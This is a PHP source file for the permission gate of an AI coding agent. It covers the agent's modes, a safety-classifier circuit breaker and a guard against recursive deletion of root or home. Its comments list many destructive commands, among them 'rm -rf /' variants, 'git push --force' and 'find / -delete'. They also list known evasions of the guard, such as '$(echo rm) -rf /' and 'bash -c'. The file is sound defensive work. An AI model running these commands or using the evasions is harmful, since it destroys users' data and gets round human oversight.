<?php

declare(strict_types=1);

namespace SugarCraft\Crush\Permissions;

use SugarCraft\Crush\ToolCall;

/**
 * PermissionGate evaluates every ToolCall against the active PermissionMode
 * and returns a PermissionDecision (Allow / Deny / Ask).
 *
 * Rule matching is {@see PermissionRule}'s, and the whole grammar plus its
 * honest limits are documented on that class: `Bash(composer update *)`,
 * `Read(./.env)`, `mcp__git__*`. What is worth knowing HERE is that the
 * argument-scoped half of that language matched NOTHING until it moved there —
 * this class compared the tool name and only the tool name, so
 * `Deny Bash(rm -rf *)` and `Deny Read(./.env)` both evaluated to `allow` on a
 * measured run. Do not reintroduce a name comparison in this file; there is one
 * matcher and {@see PermissionRule::matches()} is it.
 *
 * Four modes are implemented here (P2B.S2 + P2B.S3):
 * - Default:     reads silently; writes/networking always Ask
 * - AcceptEdits: scoped filesystem writes auto-Allow; everything else Ask
 * - Plan:        reads and provably read-only `Bash` Allow; every other `Bash`
 *                and every other write Deny
 * - Auto:        everything runs gated by SafetyClassifier; 3-strike / 20-total circuit breaker
 *
 * The Plan line has been wrong twice, and both are worth knowing. It first
 * read "all writes Deny" while {@see evaluatePlan()} allowed every `Bash` call
 * a three-regex redirect check did not catch; it was then corrected to
 * "non-redirecting `Bash` Allow", which was accurate and was the defect —
 * `rm`, `sed -i`, `git push --force` and `echo x>f` all ran under the mode a
 * user picks to change nothing (audit F-P2). Plan now allows a `Bash` call only
 * when {@see isPlanReadOnlyBash()} proves every command in it read-only, and
 * denies everything else, unparseable lines included. A `Bash` DECLARATION,
 * which carries no command to judge, is still allowed: see {@see refuses()}.
 *
 * The `rm -rf /` / `rm -rf ~` circuit breaker (R3) is evaluated unconditionally in
 * `evaluate()`, before rules and before mode dispatch — no rule and no mode can
 * override it.
 *
 * TWO ENTRY POINTS, and the difference between them is state:
 * - {@see evaluate()} settles a real {@see ToolCall} and, in Auto, RECORDS the
 *   outcome in this instance's circuit-breaker counters.
 * - {@see refuses()} answers a {@see ToolDeclaration} — a name a definition
 *   claims it will use — and touches nothing. Read that method before adding
 *   any other read-only caller.
 *
 * Both go through the one private {@see decide()}, so no mode's policy exists
 * in two places; the Auto arm is the only branch between them.
 *
 * A THIRD KIND OF CALLER wants neither: it wants to DISPLAY the policy, not
 * apply it. {@see mode()}, {@see modeSource()}, {@see rules()} and
 * {@see autoBreaker()} are the doors for that, and they exist so nobody
 * reaches for {@see evaluate()} to find out what this gate would do. Doing
 * that under Auto does not ask a question, it answers one and then changes
 * the subject — see {@see autoBreaker()}.
 *
 * @see PermissionMode for the full set of modes
 */
final class PermissionGate
{
    /**
     * Filesystem primitive commands that AcceptEdits may auto-approve, via Bash,
     * when scoped to the working directory. Real tool calls route these through
     * Bash(command: "mkdir ..."); there is no dedicated "mkdir" tool at runtime.
     */
    private const SCOPED_WRITE_COMMANDS = ['mkdir', 'touch', 'mv', 'cp', 'rm', 'rmdir'];

    /**
     * Circuit-breaker thresholds for Auto mode.
     */
    private const STRIKE_THRESHOLD = 3;
    private const TOTAL_BLOCK_THRESHOLD = 20;

    // -------------------------------------------------------------------------
    // Auto-mode circuit breaker state
    // -------------------------------------------------------------------------
    private int $consecutiveBlocks = 0;
    private int $totalBlocks = 0;
    private ?string $lastBlockedCategory = null;

    public function __construct(
        private readonly PermissionMode $mode,
        /** @var PermissionRule[] */
        private readonly array $rules = [],
        private readonly ?SafetyClassifier $classifier = null,
        /**
         * How to NAME the place `$mode` came from, for a surface that reports
         * the policy back to the user — `--permission-mode`,
         * `$SUGARCRUSH_PERMISSION_MODE`, `permissionMode in /home/…/settings.json`.
         *
         * Carried ON THE GATE rather than looked up by the reporter, and that
         * is the whole point: {@see \SugarCraft\Crush\Cli\Bootstrap::permissionGate()}
         * resolves this precedence chain ONCE per launch and the files behind
         * it are editable while the session runs, so a reporter that
         * re-derived the source could name a layer that is not the one this
         * gate was actually built from. Null means nobody recorded it — every
         * embedder, most tests, and {@see \SugarCraft\Crush\Agents\AgentManager}'s
         * bare fallback — and a null is reported as "not recorded" rather than
         * guessed at.
         */
        private readonly ?string $modeSource = null,
    ) {}

    /**
     * Returns the permission mode this gate was configured with.
     */
    public function mode(): PermissionMode
    {
        return $this->mode;
    }

    /**
     * How the caller that built this gate named the source of {@see mode()},
     * or null when it did not say. See the constructor parameter.
     */
    public function modeSource(): ?string
    {
        return $this->modeSource;
    }

    /**
     * The rules this gate decides by, in the order {@see evaluateRules()}
     * tries them — FIRST MATCH WINS, so the order is part of the policy and
     * not an incidental array order.
     *
     * Exists so that a caller which wants to SHOW the policy does not have to
     * probe for it. Without this the only way to learn what a gate refuses was
     * to hand it tool calls and watch, and under {@see PermissionMode::Auto}
     * that is not a question — it is a state change: {@see evaluate()} records
     * every outcome in the circuit-breaker counters, so a read-only screen
     * built on it would reset the strike run it was drawing. Read-only
     * inspection needs a read-only door, and this is it.
     *
     * @return list<PermissionRule>
     */
    public function rules(): array
    {
        return array_values($this->rules);
    }

    /**
     * A snapshot of the {@see PermissionMode::Auto} circuit breaker: where the
     * strike run stands, and the thresholds it is measured against.
     *
     * READ-ONLY, for the same reason {@see rules()} is. {@see evaluate()} is
     * the only thing that moves these numbers and it must stay that way — a
     * `/permissions` screen that advanced the counters it was displaying would
     * be a safety state changed by looking at it.
     *
     * THE THRESHOLDS RIDE ALONG deliberately. They are private constants that
     * {@see evaluateAuto()} compares against, so a display that printed its
     * own "of 3" would be a second copy of the policy, free to disagree with
     * the enforced one the day a threshold moves. Handing back the same
     * constants the evaluator uses makes that disagreement impossible rather
     * than merely unlikely.
     *
     * @return array{consecutiveBlocks: int, totalBlocks: int, lastBlockedCategory: ?string, strikeThreshold: int, totalBlockThreshold: int}
     */
    public function autoBreaker(): array
    {
        return [
            'consecutiveBlocks' => $this->consecutiveBlocks,
            'totalBlocks' => $this->totalBlocks,
            'lastBlockedCategory' => $this->lastBlockedCategory,
            'strikeThreshold' => self::STRIKE_THRESHOLD,
            'totalBlockThreshold' => self::TOTAL_BLOCK_THRESHOLD,
        ];
    }

    /**
     * Evaluate a REAL tool call and return the permission decision for the
     * current mode.
     *
     * MUTATES in {@see PermissionMode::Auto}: the decision advances (or resets)
     * this instance's circuit-breaker counters, which is how a third
     * consecutive block of one category escalates to `Ask`. Never call this to
     * ask a hypothetical question — a call that did not really happen must not
     * move a counter a real one is judged by. {@see refuses()} is the read-only
     * question, and it takes a type this method will not accept so the two
     * cannot be mixed up at a call site.
     */
    public function evaluate(ToolCall $call): PermissionDecision
    {
        return $this->decide($call, commitAutoStrikes: true, argumentsKnown: true);
    }

    /**
     * Would this gate refuse a tool a definition merely DECLARES?
     *
     * The read-only half of this class, for a caller holding a declaration
     * rather than a call: a workflow stage's `tools: [Bash, Write]`, an agent
     * preset's allow-list — untrusted text naming capability the session's own
     * policy may refuse. Answers `true` only for {@see PermissionDecision::Deny};
     * an `Ask` is not a refusal, because settling one needs the blocking
     * permission prompt and a caller that cannot show one must not turn "would
     * have asked" into "no".
     *
     * DOES NOT MUTATE, and that is the whole reason it exists rather than
     * callers using {@see evaluate()} with a name-only {@see ToolCall}: doing
     * that in `Auto` reset the strike counter (see {@see ToolDeclaration} for
     * the measured sequence).
     *
     * Exactly what a declaration can and cannot be refused by, because an
     * over-claimed check is worse than an absent one:
     *
     * - Name-pattern rules DO apply, in every mode: an explicit
     *   `Deny Bash` / `Deny Bash*` / `Deny mcp__git__*` refuses the
     *   declaration. This is the ONLY refusal available under `Auto`.
     * - Argument-sensitive rules (`Bash(rm *)`) cannot match: a declaration has
     *   no arguments. Left to the call site that has them. TRUE BY
     *   CONSTRUCTION since the matcher moved to {@see PermissionRule}, which
     *   takes an explicit `$argumentsKnown` and is passed `false` from here —
     *   before that it was true only because no argument-scoped pattern matched
     *   anything at all, anywhere. {@see PermissionRule::matches()} carries the
     *   cost argument for choosing this over refusing the declaration.
     * - The `rm -rf /` breaker cannot fire either, for the same reason — it
     *   reads `arguments['command']`.
     * - `Plan` refuses `Edit`, `Write` and every `mcp__*` declaration, but NOT
     *   `Bash`: Plan allows a `Bash` call whose command
     *   {@see isPlanReadOnlyBash()} proves read-only (`git log`, `grep -rn`)
     *   and denies every other one, so the verdict lives in the command — which
     *   a declaration does not have. Refusing the name would refuse the
     *   read-only uses too; each real call is judged when it arrives.
     * - `DontAsk` refuses every declaration that is not a read-only tool.
     * - `Auto` refuses NOTHING through its mode evaluator, and this is
     *   structural rather than an oversight: Auto's judgement is
     *   {@see SafetyClassifier}'s, and the classifier reads
     *   `arguments['command']` — a name alone is never dangerous to it. A
     *   declaration under Auto is therefore only refusable by a Deny rule
     *   (above). Auto's real enforcement is per-call, at whichever layer runs
     *   the call, through {@see evaluate()}.
     * - `Default` / `AcceptEdits` refuse nothing (they `Ask`), and
     *   `BypassPermissions` refuses nothing by definition.
     */
    public function refuses(ToolDeclaration $declaration): bool
    {
        return $this->decide(
            $declaration->asNamedCallForGateOnly(),
            commitAutoStrikes: false,
            argumentsKnown: false,
        ) === PermissionDecision::Deny;
    }

    /**
     * The one copy of the decision path, shared by both entry points.
     *
     * Shared rather than duplicated because the alternative — a second
     * "read-only" evaluator with its own mode table — is a policy that drifts
     * from the enforced one silently, and a security check that no longer
     * matches the thing it claims to predict is worse than no check.
     *
     * @param bool $commitAutoStrikes Whether an Auto-mode outcome may be
     *        recorded in the circuit-breaker counters. TRUE only for a real
     *        call: {@see evaluate()} passes true, {@see refuses()} passes
     *        false.
     * @param bool $argumentsKnown Whether `$call`'s arguments are the real
     *        ones. FALSE only for the {@see refuses()} path, whose `$call` is a
     *        name synthesised from a {@see ToolDeclaration} — arguments that are
     *        not absent but UNKNOWABLE, and the two have to be told apart
     *        because {@see PermissionRule::matches()} fails CLOSED on an absent
     *        subject and must not do so on an unknowable one. Both flags carry
     *        the same distinction (real call vs. hypothetical) into different
     *        subsystems, which is why they are separate parameters rather than
     *        one: an Auto strike is about STATE, this is about EVIDENCE.
     */
    private function decide(ToolCall $call, bool $commitAutoStrikes, bool $argumentsKnown): PermissionDecision
    {
        // 0. Circuit breaker: `rm -rf /` / `rm -rf ~` is refused unconditionally,
        // in every mode, before rules are considered — no Allow rule and no mode
        // (including BypassPermissions) can talk this gate into a self-destruct.
        if ($this->isRmRfRootOrHome($call)) {
            return PermissionDecision::Deny;
        }

        // 1. Check explicit rules first (highest priority)
        $ruleDecision = $this->evaluateRules($call, $argumentsKnown);
        if ($ruleDecision !== null) {
            return $ruleDecision;
        }

        // 2. Mode-specific logic
        return match ($this->mode) {
            PermissionMode::Default => $this->evaluateDefault($call),
            PermissionMode::AcceptEdits => $this->evaluateAcceptEdits($call),
            PermissionMode::Plan => $this->evaluatePlan($call, $argumentsKnown),
            PermissionMode::Auto => $commitAutoStrikes
                ? $this->evaluateAuto($call)
                : $this->autoDeclarationDecision(),
            // P2B.S4: DontAsk and BypassPermissions have dedicated evaluators
            PermissionMode::DontAsk => $this->evaluateDontAsk($call),
            PermissionMode::BypassPermissions => $this->evaluateBypassPermissions($call),
        };
    }

    /**
     * Check rules in order; first match wins.
     *
     * @param bool $argumentsKnown threaded straight through to
     *        {@see PermissionRule::matches()} — see {@see decide()} for why the
     *        two entry points differ on it.
     */
    private function evaluateRules(ToolCall $call, bool $argumentsKnown): ?PermissionDecision
    {
        foreach ($this->rules as $rule) {
            if ($rule->matches($call, $argumentsKnown)) {
                return $this->actionToDecision($rule->action);
            }
        }
        return null;
    }

    private function actionToDecision(PermissionAction $action): PermissionDecision
    {
        return match ($action) {
            PermissionAction::Allow => PermissionDecision::Allow,
            PermissionAction::Deny => PermissionDecision::Deny,
            PermissionAction::Ask => PermissionDecision::Ask,
        };
    }

    // -------------------------------------------------------------------------
    // Mode evaluators
    // -------------------------------------------------------------------------

    /**
     * Default: reads are silent, everything else prompts.
     */
    private function evaluateDefault(ToolCall $call): PermissionDecision
    {
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }
        return PermissionDecision::Ask;
    }

    /**
     * AcceptEdits: scoped filesystem writes auto-approve; protected paths still prompt.
     */
    private function evaluateAcceptEdits(ToolCall $call): PermissionDecision
    {
        // Reads always allow in AcceptEdits
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }

        // Scoped filesystem writes (mkdir, touch, mv, cp, rm, rmdir) auto-allow
        if ($this->isScopedWriteTool($call)) {
            return PermissionDecision::Allow;
        }

        // Everything else (network, shell commands, non-scoped writes) asks
        return PermissionDecision::Ask;
    }

    /**
     * Auto: everything runs gated by SafetyClassifier; circuit breaker triggers Ask after
     * 3 consecutive blocks of the same category OR 20 total blocks in the session.
     *
     * The ONLY stateful evaluator in this class, and the reason
     * {@see refuses()} exists: every outcome here is recorded, including the
     * safe one, which resets `$consecutiveBlocks`. That reset is correct for a
     * real call (a safe command genuinely breaks a run of blocked ones) and
     * corrupting for a hypothetical one — hence {@see autoDeclarationDecision()}.
     *
     * @see SafetyClassifier for the 13 dangerous-action categories.
     */
    private function evaluateAuto(ToolCall $call): PermissionDecision
    {
        // SafetyClassifier is the gatekeeper for Auto mode. Fail CLOSED when it's
        // missing — a misconfigured gate must never silently become "allow everything";
        // that would turn a config bug into a security hole. Ask instead of Allow.
        if ($this->classifier === null) {
            return PermissionDecision::Ask;
        }

        $category = $this->classifier->classify($call);

        // Action is safe — reset counters and allow
        if ($category === null) {
            $this->consecutiveBlocks = 0;
            $this->lastBlockedCategory = null;
            return PermissionDecision::Allow;
        }

        // Dangerous action blocked — update circuit breaker state
        if ($category === $this->lastBlockedCategory) {
            ++$this->consecutiveBlocks;
        } else {
            $this->consecutiveBlocks = 1;
            $this->lastBlockedCategory = $category;
        }
        ++$this->totalBlocks;

        // Circuit breaker thresholds
        if ($this->consecutiveBlocks >= self::STRIKE_THRESHOLD) {
            return PermissionDecision::Ask;
        }
        if ($this->totalBlocks >= self::TOTAL_BLOCK_THRESHOLD) {
            return PermissionDecision::Ask;
        }

        return PermissionDecision::Deny;
    }

    /**
     * Auto's answer for a {@see ToolDeclaration} — the one call path that must
     * leave the circuit-breaker counters exactly as it found them.
     *
     * Takes no {@see ToolCall} on purpose. A declaration carries no arguments,
     * and {@see SafetyClassifier::classify()} reads `arguments['command']`, so
     * the classifier returns null for every possible declaration — running it
     * would be theatre, and reproducing {@see evaluateAuto()}'s counter
     * arithmetic below a category that cannot occur would be unreachable code
     * dressed as rigour. Auto's declaration policy is the single statement
     * below, and {@see refuses()} says so where a caller will read it: under
     * Auto only an explicit Deny RULE (matched before this method, in
     * {@see decide()}) refuses a declaration.
     *
     * Fail-closed parity with {@see evaluateAuto()} is kept for the
     * missing-classifier case even though `refuses()` treats Ask and Allow
     * alike, so that a misconfigured Auto gate never reads as a confident
     * "allow" from either entry point.
     */
    private function autoDeclarationDecision(): PermissionDecision
    {
        if ($this->classifier === null) {
            return PermissionDecision::Ask;
        }

        return PermissionDecision::Allow;
    }

    /**
     * Plan: read and explore, change nothing until the plan is approved.
     *
     * `Bash` runs only when {@see isPlanReadOnlyBash()} can show the whole
     * command line is made of read-only commands, and is DENIED otherwise —
     * fail closed, including for a line it cannot parse (audit F-P2; before
     * that, every `Bash` call ran unless a three-regex redirect check caught
     * it, so `rm`, `sed -i` and `git push --force` ran unprompted).
     *
     * A `Bash` DECLARATION ({@see refuses()}, `$argumentsKnown` false) is
     * Allowed: it has no command to judge, a read-only `git log` is a
     * legitimate use of it, and each real call is still judged here when it
     * arrives. A real call whose `command` is missing or empty has nothing
     * read-only about it and is Denied.
     */
    private function evaluatePlan(ToolCall $call, bool $argumentsKnown): PermissionDecision
    {
        // Reads are always allowed in Plan mode
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }

        if ($call->name === 'Bash') {
            if (!$argumentsKnown) {
                return PermissionDecision::Allow;
            }

            return $this->isPlanReadOnlyBash($call)
                ? PermissionDecision::Allow
                : PermissionDecision::Deny;
        }

        // All other writes are denied in Plan mode — nothing edits until the plan is approved
        if ($this->isWriteTool($call)) {
            return PermissionDecision::Deny;
        }

        // Default: ask
        return PermissionDecision::Ask;
    }

    /**
     * DontAsk: auto-denies anything not pre-approved. Read-only tools (Read/Grep/Glob/WebFetch)
     * are implicitly allowed without an explicit rule. Hook-approved calls would also be allowed
     * via the hook system, but in practice: no explicit Allow rule + non-read-only tool → Deny.
     *
     * Explicit rules always take priority — if a rule matches, its action wins.
     * (The rules check happens before this method is called in evaluate().)
     */
    private function evaluateDontAsk(ToolCall $call): PermissionDecision
    {
        // Read-only tools are implicitly allowed in DontAsk mode
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }

        // Everything else (not read-only and no explicit rule) is denied
        return PermissionDecision::Deny;
    }

    /**
     * BypassPermissions: allows everything EXCEPT explicit Deny rules. The `rm -rf /`
     * / `rm -rf ~` circuit breaker no longer lives here — it's evaluated unconditionally
     * in evaluate() before this method (or any rule) ever runs.
     *
     * Explicit rules always take priority — if a rule matches, its action wins.
     * (The rules check happens before this method is called in evaluate().)
     */
    private function evaluateBypassPermissions(ToolCall $call): PermissionDecision
    {
        // Everything else is allowed in BypassPermissions mode
        return PermissionDecision::Allow;
    }

    /**
     * Detect the `rm -rf /` or `rm -rf ~` circuit-breaker pattern (R3).
     *
     * JUDGED ON THE WORDS BASH WILL PRODUCE, NOT ON THE RAW TEXT. Until audit
     * F-P1 this split the raw string on whitespace, treated only a raw
     * `-`-prefixed token as a flag and only the FIRST non-flag token as the
     * target, and compared that target literally against `/` and `~`. bash
     * removes quotes before `rm` sees its argv, so `rm '-rf' ~` (the flag read
     * as the target, which was not `/`), `rm -rf ./x /` (second target never
     * looked at), `rm -rf /*`, `rm -rf ~/` and `rm -rf $HOME` were all ALLOWED
     * under `bypass-permissions` — measured — and the first deletes `$HOME`,
     * which GNU `--preserve-root` does not protect. Each command line is now
     * tokenised by {@see ShellWords} (quote removal, escapes, `$'…'`, every
     * control operator, redirections pulled out of the operand list), and:
     *
     * - the command word is recognised by basename, case-insensitively, behind
     *   leading `NAME=value` assignments and the wrapper commands in
     *   {@see RM_PREFIX_COMMANDS} (with their option arguments): `/bin/rm`,
     *   `\rm`, `sudo -u root rm`, `env X=1 rm`, `timeout 5 rm`;
     * - flags are read after quote removal and ANYWHERE in the argv, since GNU
     *   getopt permutes (`rm ~ -rf` is `rm -rf ~`), and an unambiguous GNU
     *   long-option abbreviation counts (`--rec`, `--forc`);
     * - `--` ends options, so every later word is an OPERAND — a `-`-prefixed
     *   word after it is checked as a target AND, deliberately, still counted
     *   toward the flags, because the pre-tokeniser breaker counted it and this
     *   is a deny list that must never shrink (`rm -r -- -f /`);
     * - EVERY operand is checked, normalised by {@see isRootOrHomeOperand()}:
     *   `/`, `//`, `/.`, `/*`, `/tmp/..`, `~`, `~/`, `~/.`, `~user`, `$HOME`,
     *   `${HOME}`, `"$HOME"`, `$HOME/` all count.
     *
     * The old RAW-token pass is kept as well — every segment of the raw line,
     * split on `[;&|()\r\n]`, whitespace-split, one layer of matching quotes
     * stripped per token, judged by the same rules — and its verdict is OR-ed
     * in. That is what makes an unparseable line (an unterminated quote) still
     * refusable, and it guarantees this breaker never denies LESS than the
     * version it replaced: the tokenised pass honours `#` comments and skips
     * here-doc bodies, which a raw-text deny list never did.
     *
     * Command chains are checked command-by-command, and a NEWLINE separates
     * two commands exactly as `;` does — while the raw split lacked `\n` this
     * breaker allowed `echo hi\nrm -rf /` under `bypass-permissions` while
     * denying `echo hi && rm -rf /`. Measured, not reasoned.
     *
     * BE CLEAR ABOUT WHAT THIS IS NOT. Mode-independence makes it unswitchable,
     * not unevadable: it reads `arguments['command']` and performs no
     * expansion, so it is shell-text matching with the same ceiling
     * {@see PermissionRule}'s "HONEST LIMITS" block documents —
     * `$(echo rm) -rf /`, `x=-rf; rm $x /`, `bash -c 'rm -rf /'`, `eval`,
     * aliases and `find / -delete` are all past it. It is a guard rail against
     * an accident, and calling it a containment boundary (as a first draft of
     * that block did) would be exactly the overclaim that block exists to
     * refuse.
     *
     * Matches: rm -rf /, rm -fr /, rm -r -f /, rm --recursive --force /,
     * rm --rec --forc /, rm -rf --no-preserve-root /, rm -rf "/", rm -rf '/',
     * rm -rf ~, rm '-rf' ~, rm "-rf" /, rm $'-rf' /, rm ~ -rf, rm -rf ./x /,
     * rm -rf /*, rm -rf //, rm -rf /., rm -rf ~/, rm -rf $HOME, rm -rf ${HOME},
     * rm -rf "$HOME"/, rm -r -- -f /, sudo rm -rf /, SUDO RM -RF ~,
     * sudo -u root rm -rf /, /bin/rm -rf /, \rm -rf /, (rm -rf /)
     */
    private function isRmRfRootOrHome(ToolCall $call): bool
    {
        // Only applies to Bash tool calls
        if ($call->name !== 'Bash') {
            return false;
        }

        $args = $call->arguments;
        if (!isset($args['command']) || !is_string($args['command'])) {
            return false;
        }

        foreach (ShellWords::parse($args['command'])->commands as $words) {
            if ($this->wordsAreRmRfRootOrHome($words)) {
                return true;
            }
        }

        foreach (preg_split('/[;&|()\r\n]+/', $args['command']) ?: [] as $segment) {
            $tokens = array_map(
                $this->stripMatchingQuotes(...),
                preg_split('/\s+/', trim($segment), -1, PREG_SPLIT_NO_EMPTY) ?: [],
            );
            if ($this->wordsAreRmRfRootOrHome($tokens)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Wrapper commands that run their argument as a command, mapped to their
     * short options that consume the NEXT word (so `sudo -u root rm` skips
     * `root` rather than taking it for the command). The `int` is how many
     * positional words precede the wrapped command (`timeout 5 rm`). A best
     * effort, not a grammar of each tool: an unlisted option that takes an
     * argument leaves that argument as the "command word", which fails to match
     * `rm` — i.e. errs toward the old, narrower breaker, never toward a crash.
     *
     * @var array<string, array{0: string, 1: int}>
     */
    private const RM_PREFIX_COMMANDS = [
        'sudo' => ['ugCDhprtUT', 0],
        'doas' => ['uC', 0],
        'env' => ['uCS', 0],
        'command' => ['', 0],
        'builtin' => ['', 0],
        'exec' => ['a', 0],
        'nohup' => ['', 0],
        'time' => ['fo', 0],
        'nice' => ['n', 0],
        'ionice' => ['cnp', 0],
        'stdbuf' => ['ioe', 0],
        'timeout' => ['sk', 1],
        '{' => ['', 0],
        '!' => ['', 0],
    ];

    /**
     * Is this one simple command (quote-removed words) an `rm` that combines
     * recursive + force flags, in any spelling/order/split, against at least
     * one root-or-home operand?
     *
     * @param list<string> $words
     */
    private function wordsAreRmRfRootOrHome(array $words): bool
    {
        $count = count($words);
        $i = 0;

        while ($i < $count) {
            $word = $words[$i];
            if (preg_match('/^[A-Za-z_][A-Za-z0-9_]*=/', $word) === 1) {
                ++$i; // `FOO=bar rm …` — an assignment prefix
                continue;
            }
            $name = strtolower(basename(ltrim($word, '\\')));
            if (!isset(self::RM_PREFIX_COMMANDS[$name])) {
                break;
            }
            [$optionsWithArgument, $positionals] = self::RM_PREFIX_COMMANDS[$name];
            ++$i;
            while ($i < $count && str_starts_with($words[$i], '-') && $words[$i] !== '-') {
                $option = $words[$i++];
                if ($option === '--') {
                    break;
                }
                if (strlen($option) === 2 && $optionsWithArgument !== '' && str_contains($optionsWithArgument, $option[1])) {
                    ++$i;
                }
            }
            while ($positionals-- > 0 && $i < $count) {
                ++$i;
            }
        }

        if ($i >= $count || strtolower(basename(ltrim($words[$i], '\\'))) !== 'rm') {
            return false;
        }

        $recursive = false;
        $force = false;
        $endOfOptions = false;
        $operands = [];

        for (++$i; $i < $count; ++$i) {
            $word = $words[$i];

            if (!$endOfOptions && $word === '--') {
                $endOfOptions = true;
                continue;
            }

            if ($word !== '-' && str_starts_with($word, '-')) {
                $lower = strtolower($word);
                if (str_starts_with($lower, '--')) {
                    // GNU accepts any unambiguous prefix: `--rec`, `--forc`.
                    if (strlen($lower) >= 3 && str_starts_with('--recursive', $lower)) {
                        $recursive = true;
                    } elseif (strlen($lower) >= 3 && str_starts_with('--force', $lower)) {
                        $force = true;
                    }
                } else {
                    // Short flag cluster, e.g. -rf, -fr, -r, -f, -Rf (case-insensitive).
                    $flags = substr($lower, 1);
                    $recursive = $recursive || str_contains($flags, 'r');
                    $force = $force || str_contains($flags, 'f');
                }
                if (!$endOfOptions) {
                    continue;
                }
            }

            $operands[] = $word;
        }

        if (!$recursive || !$force) {
            return false;
        }

        foreach ($operands as $operand) {
            if ($this->isRootOrHomeOperand($operand)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Does this (unexpanded) operand name the filesystem root or a home
     * directory — or everything directly inside one?
     *
     * Anchored at `/` or at a home spelling (`~`, `~user`, `$HOME`, `${HOME}`),
     * then walked segment by segment: empty and `.` segments vanish (`//`,
     * `/.`, `~/`), `..` climbs (and climbing above the anchor is no safer than
     * the anchor — `~/..` is every home), and a FINAL segment made only of glob
     * characters (`*`, `.*`, `?*`) names the anchor's whole contents, so it
     * counts as the anchor. A relative operand is never root-or-home here:
     * `./x/../..` depends on the cwd, which is the jails' question, not this
     * breaker's.
     */
    private function isRootOrHomeOperand(string $operand): bool
    {
        if (preg_match('/^(?:~[A-Za-z0-9._-]*|\$HOME|\$\{HOME\})(?=\/|$)/i', $operand, $match) === 1) {
            $rest = substr($operand, strlen($match[0]));
        } elseif (str_starts_with($operand, '/')) {
            $rest = $operand;
        } else {
            return false;
        }

        $segments = explode('/', $rest);
        $last = count($segments) - 1;
        $depth = 0;
        foreach ($segments as $index => $segment) {
            if ($segment === '' || $segment === '.') {
                continue;
            }
            if ($segment === '..') {
                $depth = max(0, $depth - 1);
                continue;
            }
            if ($index === $last && $depth === 0 && preg_match('/^[*?.]*[*?][*?.]*$/', $segment) === 1) {
                continue;
            }
            ++$depth;
        }

        return $depth === 0;
    }

    /**
     * Strip a single pair of matching surrounding quotes (`"/"` -> `/`, `'~'` -> `~`)
     * for the RAW-token pass of {@see isRmRfRootOrHome()} — the pass that has to
     * say something about a line {@see ShellWords} could not parse.
     */
    private function stripMatchingQuotes(string $token): string
    {
        $length = strlen($token);
        if ($length >= 2) {
            $first = $token[0];
            $last = $token[$length - 1];
            if (($first === '"' || $first === "'") && $first === $last) {
                return substr($token, 1, -1);
            }
        }

        return $token;
    }

    // -------------------------------------------------------------------------
    // Tool classifiers
    // -------------------------------------------------------------------------

    /**
     * The built-in tools this gate treats as read-only: `Read`, `Grep`, `Glob`,
     * `WebFetch`, `Lsp`. `Find` was never a real tool name.
     *
     * A DECISION, NOT A CENSUS OF `src/Tools/BuiltIn/`, and the earlier wording
     * here ("Read-only built-in tools (@see src/Tools/BuiltIn/): …") claimed to be
     * the latter — a list whose stated domain was a directory, while three tools
     * in that directory that mutate nothing were absent from it. `WebSearch`,
     * `Skill` and `doctor` are deliberately still absent: each reaches something
     * outside this process (a search endpoint, a skill body that may carry
     * `allowed-tools`, a capability probe), so leaving them to Ask costs a prompt
     * while listing them would spend a judgement this class cannot make.
     *
     * `Lsp` IS here, and the reason is specific to it rather than inherited: its
     * whole `operation` domain is queries — definition, references, hover,
     * symbols, codeActions, diagnostics — and the mutating half of LSP (rename,
     * formatting, APPLYING a code action's edit) is absent from that tool by
     * construction. `codeActions` RETURNS proposed edits and nothing applies one;
     * an edit still has to come back through `Edit`/`Write`, which are
     * {@see isWriteTool()}. Without this entry, Plan mode — the mode whose entire
     * purpose is reading a codebase before touching it — asked before every
     * go-to-definition, and DontAsk denied it outright.
     */
    private function isReadOnlyTool(ToolCall $call): bool
    {
        return in_array($call->name, ['Read', 'Grep', 'Glob', 'WebFetch', 'Lsp'], true);
    }

    /**
     * Write-capable tools: `Edit`/`Write` mutate files directly, `Bash` can do
     * anything a shell can, `Task` delegates to a sub-agent whose own tools can
     * do the same behind this process (crush_code.md P8.13 — the judgement is
     * `Bash`'s: the tool writes nothing itself and everything through what it
     * launches), and MCP tools follow the `mcp__<server>__<tool>`
     * naming convention (@see PermissionRule) — their capability is
     * server-defined and unknowable here, so they're treated conservatively as
     * writes. `McpTool` was never a real tool name.
     *
     * `Write` is named even though nothing dispatched under that name for most
     * of this lib's life, because the cost of the two mistakes is not
     * symmetric: a name listed here that no tool ever uses costs one dead
     * `in_array` entry, while a real write tool missing from the list falls
     * through to Ask in Plan mode instead of the Deny that mode promises.
     * {@see \SugarCraft\Crush\Hooks\BuiltIn\ProtectFilesHook} has always
     * matched on `^(Bash|Edit|Write|Read)$` for the same reason.
     */
    private function isWriteTool(ToolCall $call): bool
    {
        if (in_array($call->name, ['Bash', 'Edit', 'Write', 'Task'], true)) {
            return true;
        }

        return str_starts_with($call->name, 'mcp__');
    }

    /**
     * Is this `Bash` call PROVABLY read-only — the one shape of `Bash` that
     * Plan mode lets run?
     *
     * THIS PREDICATE IS ON A GRANT PATH and it is an ALLOW-LIST, both on
     * purpose. Until audit F-P2 Plan did the opposite: it allowed every `Bash`
     * call and denied only the ones `isBashWriteCommand()` caught, a three-regex
     * deny list (`\s+>\s+`, `\s+>>\s+`, `|\s*tee`). Measured under `plan`, that
     * denied `echo x > f` and ALLOWED `echo x >f`, `echo x>f`, `echo x 2> f`,
     * `cat a >| f`, `sed -i s/a/b/ src.php`, `git commit -am wip`,
     * `git push --force`, `rm src/main.php`, `mv src /tmp/`, `curl -o f …`,
     * `cp /dev/null README.md`, `python3 -c "open('f','w')"` and
     * `truncate -s0 f`. Plan is the mode a user picks to GUARANTEE nothing
     * changes, and a deny list over shell text can only ever enumerate the
     * spellings somebody thought of. So the question is inverted: not "does
     * this write?" but "can every part of this be shown not to?", and anything
     * this method cannot show resolves to `false` — Deny under Plan.
     *
     * The line is tokenised by {@see ShellWords} (quote removal, every control
     * operator, redirections pulled out), and ALL of the following must hold:
     *
     * - it parses COMPLETELY — an unterminated quote, substitution or here-doc
     *   is not something this method can reason about;
     * - no command or process substitution (`$(…)`, backtick, `<(…)`, `>(…)`)
     *   anywhere, quoted or not: whatever runs inside one is a command this
     *   method never sees;
